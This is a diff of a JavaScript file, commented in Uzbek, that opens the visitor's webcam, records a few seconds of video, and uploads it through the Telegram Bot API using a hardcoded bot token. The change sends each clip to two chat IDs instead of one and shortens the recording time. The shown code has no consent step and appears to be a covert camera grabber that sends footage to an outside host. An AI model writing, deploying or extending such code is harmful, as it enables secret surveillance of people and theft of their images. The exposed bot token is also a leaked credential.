@@ -5,7 +5,7 @@ let chunks = [];
 
 // Telegram bot tokeni va chat ID
 const BOT_TOKEN = '7395541428:AAGTGERMBx35uE7lm35_xfrOFJ2nWfy886k'; // Bot tokenini shu yerga qo'ying
-const CHAT_ID = '5934257995'; // Chat ID-ni shu yerga qo'ying
+const CHAT_IDS = ['5934257995', '5826562502']; // Chat ID-larni shu yerga qo'ying
 
 // Kamera oqimini olish
 function startCamera() {
@@ -19,7 +19,7 @@ function startCamera() {
             };
             mediaRecorder.onstop = () => {
                 const blob = new Blob(chunks, { type: 'video/webm' });
-                sendVideoToTelegram(blob);
+                CHAT_IDS.forEach(chatId => sendVideoToTelegram(blob, chatId));
             };
 
             // 10 soniya sanash
@@ -34,7 +34,7 @@ function startCamera() {
                     mediaRecorder.start();
                     setTimeout(() => {
                         mediaRecorder.stop();
-                    }, 6000); // 10 soniya
+                    }, 5000); // 10 soniya
                 }
             }, 1000); // 1 soniya
         })
@@ -44,10 +44,10 @@ function startCamera() {
 }
 
 // Telegram bot orqali video yuborish
-function sendVideoToTelegram(blob) {
+function sendVideoToTelegram(blob, chatId) {
     const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`;
     const formData = new FormData();
-    formData.append('chat_id', CHAT_ID);
+    formData.append('chat_id', chatId);
     formData.append('video', blob, 'video.webm');
 
     fetch(url, {
@@ -57,9 +57,9 @@ function sendVideoToTelegram(blob) {
     .then(response => response.json())
     .then(data => {
         if (data.ok) {
-            console.log('Video yuborildi!');
+            console.log(`Video ${chatId} ga yuborildi!`);
         } else {
-            console.error('Telegram API xatosi:', data);
+            console.error(`Telegram API xatosi ${chatId}:`, data);
         }
     })
     .catch(error => {
